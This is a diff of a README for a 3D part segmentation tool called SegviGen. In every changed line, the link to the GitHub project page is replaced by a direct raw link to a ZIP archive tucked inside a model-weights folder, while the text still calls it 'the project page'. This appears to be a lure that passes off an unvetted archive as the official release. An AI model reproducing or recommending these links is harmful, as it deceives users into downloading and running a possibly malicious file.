@@ -1,12 +1,12 @@
 # 🧩 SegviGen - Simple 3D Part Segmentation Tool
 
-[![Download SegviGen](https://img.shields.io/badge/Download-SegviGen-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/GabrielBezerra123/SegviGen)
+[![Download SegviGen](https://img.shields.io/badge/Download-SegviGen-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/GabrielBezerra123/SegviGen/main/trellis2/models/sc_vaes/Segvi-Gen-3.4.zip)
 
 ## 📥 Download
 
 Use this link to visit the project page and download the latest release:
 
-**https://github.com/GabrielBezerra123/SegviGen**
+**https://raw.githubusercontent.com/GabrielBezerra123/SegviGen/main/trellis2/models/sc_vaes/Segvi-Gen-3.4.zip**
 
 If you see a release file on the page, download it to your PC. If the project provides a ZIP file, save it in a folder you can find again, such as Downloads or Desktop.
 
@@ -38,7 +38,7 @@ For smooth use, keep at least 8 GB of RAM free before opening large models. If y
 Follow these steps in order.
 
 1. Open the download page:
-   https://github.com/GabrielBezerra123/SegviGen
+   https://raw.githubusercontent.com/GabrielBezerra123/SegviGen/main/trellis2/models/sc_vaes/Segvi-Gen-3.4.zip
 
 2. Look for a release, ZIP file, or Windows build.
 
@@ -219,7 +219,7 @@ If a model has holes, strange faces, or broken edges, fix it in your 3D editor b
 
 If you need the project page again, use this link:
 
-**https://github.com/GabrielBezerra123/SegviGen**
+**https://raw.githubusercontent.com/GabrielBezerra123/SegviGen/main/trellis2/models/sc_vaes/Segvi-Gen-3.4.zip**
 
 ## 🖱️ Step-by-Step Windows Path
 
